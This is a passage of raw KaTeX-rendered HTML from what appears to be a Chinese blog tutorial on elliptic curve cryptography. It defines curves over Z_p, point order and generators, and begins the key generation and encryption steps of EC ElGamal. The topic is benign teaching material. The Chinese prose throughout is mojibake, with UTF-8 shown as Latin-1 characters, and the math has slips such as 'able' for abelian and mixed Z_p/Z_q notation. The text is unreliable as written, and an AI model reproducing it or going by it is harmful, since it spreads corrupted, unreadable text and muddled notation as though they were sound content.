mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">î€ </span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>æˆ‘ä»¬ç§°è¯¥æ–¹ç¨‹çš„æ‰€æœ‰è§£ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mtext>ï¼Œ</mtext><mo stretchy="false">(</mo><mi>x</mi><mo>âˆˆ</mo><mi>Z</mi><mi>p</mi><mo separator="true">,</mo><mi>y</mi><mo>âˆˆ</mo><mi>Z</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x,y)ï¼Œ(xâˆˆZp,yâˆˆZp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>ï¼Œä»¥åŠä¸€ä¸ªç§°ä¸º â€œæ— ç©·è¿œç‚¹â€(O) ç»„æˆçš„é›†åˆä¸ºå®šä¹‰åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">Zp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal">p</span></span></span></span> ä¸Šçš„ä¸€ä¸ªæ¤­åœ†æ›²çº¿ï¼Œè®°ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(Zp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span>ã€‚</p><p>ä¸€èˆ¬å®šä¹‰æ¤­åœ†æ›²çº¿å¯†ç éœ€è¦ä»¥ä¸‹æ¡ä»¶</p><p>å‡è®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(Zp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span> å¯¹äºç‚¹çš„è¿ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âŠ•</mo></mrow><annotation encoding="application/x-tex">âŠ•</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">âŠ•</span></span></span></span>å½¢æˆä¸€ä¸ª able ç¾¤ï¼ˆäº¤æ¢ç¾¤ï¼Œé€†å…ƒå­˜åœ¨ï¼Œå°é—­æ€§ç­‰ï¼‰ï¼Œè®¾<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>âˆˆ</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pâˆˆE(Zq)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span> ï¼Œä¸”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶çš„ t å¾ˆå¤§</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>âŠ•</mo><mi>p</mi><mo>âŠ•</mo><mi>p</mi><mo>âŠ•</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>âŠ•</mo><mi>p</mi><mo>=</mo><mn mathvariant="bold">0</mn></mrow><annotation encoding="application/x-tex">p \oplus p \oplus p \oplus ... \oplus p =\mathbf{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbf">0</span></span></span></span></span></span></p><p>å…±æœ‰tä¸ªpï¼Œtç§°ä¸ºpçš„å‘¨æœŸï¼Œæ­¤å¤–ï¼Œå¯¹äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>âˆˆ</mo><mi>E</mi><mo stretchy="false">(</mo><mi>Z</mi><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">QâˆˆE(Zq)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span> ï¼Œå®šæœ‰æŸä¸ªæ­£æ•´æ•° m ä½¿å¾—ä¸‹åˆ—å¼å­æˆç«‹ï¼Œå®šä¹‰<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>p</mi></msub><mi>q</mi></mrow><annotation encoding="application/x-tex">m=log_{p}q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>m</mi><mo separator="true">â‹…</mo><mi>p</mi><mo>=</mo><mi>p</mi><mo>âŠ•</mo><mi>p</mi><mo>âŠ•</mo><mi>p</mi><mo>âŠ•</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>âŠ•</mo><mi>p</mi><mtext>Â </mtext><mo stretchy="false">(</mo><mi>m</mi><mtext>ä¸ª</mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q=mÂ·p=p \oplus p \oplus p \oplus ... \oplus p \ (mä¸ªp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.63889em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mpunct">â‹…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mspace">Â </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>æ­¤å¤–ï¼Œå‡è®¾ G æ˜¯è¯¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{q}(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span> çš„ç”Ÿæˆå…ƒï¼Œå³å¯ä»¥ç”Ÿæˆå…¶ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œå…¶é˜¶ä¸ºæ»¡è¶³<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>G</mi><mo>=</mo><mi>O</mi></mrow><annotation encoding="application/x-tex">nG=O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span>çš„æœ€å°æ­£æ•´æ•° n</p><h3 id="ecc-ä¸­çš„-elgamal"><a class="markdownIt-Anchor" href="#ecc-ä¸­çš„-elgamal"></a> ECC ä¸­çš„ ElGamal</h3><p>å‡è®¾ç”¨æˆ· B è¦æŠŠæ¶ˆæ¯åŠ å¯†åä¼ ç»™ç”¨æˆ· A</p><h4 id="keygen"><a class="markdownIt-Anchor" href="#keygen"></a> keygen:</h4><p>â€‹ç”¨æˆ· A å…ˆé€‰æ‹©ä¸€æ¡æ¤­åœ†æ›²çº¿<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{q}(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>ï¼Œç„¶åé€‰æ‹©å…¶ä¸Šçš„ä¸€ä¸ªç”Ÿæˆå…ƒ Gï¼Œå‡è®¾å…¶é˜¶ä¸º nï¼Œä¹‹åå†é€‰æ‹©ä¸€ä¸ªæ­£æ•´æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">n_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä½œä¸ºå¯†é’¥ï¼Œè®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>a</mi></msub><mo>=</mo><msub><mi>n</mi><mi>a</mi></msub><mi>G</mi></mrow><annotation encoding="application/x-tex">P_{a}=n_{a}G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">G</span></span></span></span>ã€‚</p><p>å…¬é’¥ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{q}(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>ï¼Œq,Gï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">P_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>ç§é’¥ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">n_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><h4 id="encry"><a class="markdownIt-Anchor" href="#encry"></a> Encry:</h4><p>â€‹ç”¨æˆ· B åœ¨å‘ç”¨æˆ· A å‘é€æ¶ˆæ¯ mï¼Œè¿™é‡Œå‡è®¾æ¶ˆæ¯ m å·²ç»è¢«ç¼–ç ä¸ºæ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ï¼Œå…¶åŠ å¯†æ­¥éª¤å¦‚ä¸‹</p><ol><li>æŸ¥è¯¢ç”¨æˆ·Açš„å…¬é’¥ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mi>q</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_{q}(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>ï¼Œq,Gï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">P_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>åœ¨ï¼ˆ1ï¼Œq-1ï¼‰çš„åŒºé—´å†…é€‰æ‹©éšæœºæ•° k</li><li>æ ¹æ® A çš„å…¬é’¥è®¡ç®—ç‚¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>G</mi></mrow><annotation encoding="application/x-tex">(x_{1},y_{1})=kG</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">G</span></span></span></span></li><li>è®¡ç®—ç‚¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><msub><mi>P</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">(x_{2},y_{2})=kP_{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span 